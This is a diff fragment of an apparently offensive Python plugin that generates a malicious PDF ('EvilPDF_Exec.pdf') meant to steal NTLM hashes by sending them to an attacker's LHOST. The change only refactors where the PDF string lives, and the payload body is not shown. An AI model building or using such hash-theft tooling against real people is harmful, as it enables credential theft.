@@ -2,12 +2,13 @@ Description = 'Steal the NTLM hash using malicious PDF file'
 from plugin_support import *
 
 init = {
-	# NAME    VALUE
 	'interface':ask.interface,
 	'LHOST':ask.LHOST
 }
 
-evil_code = """
+def run():
+	global init
+	evil_code = """
 %PDF-1.7
 1 0 obj
 <</Type/Catalog/Pages 2 0 R>>
@@ -64,9 +65,7 @@ trailer
 <<
 	/Root 1 0 R
 >>
-%%EOF
-"""
-def run():
+%%EOF"""
 	try:
 		text("Creating PDF...")
 		pdf = open("EvilPDF_Exec.pdf", "w")
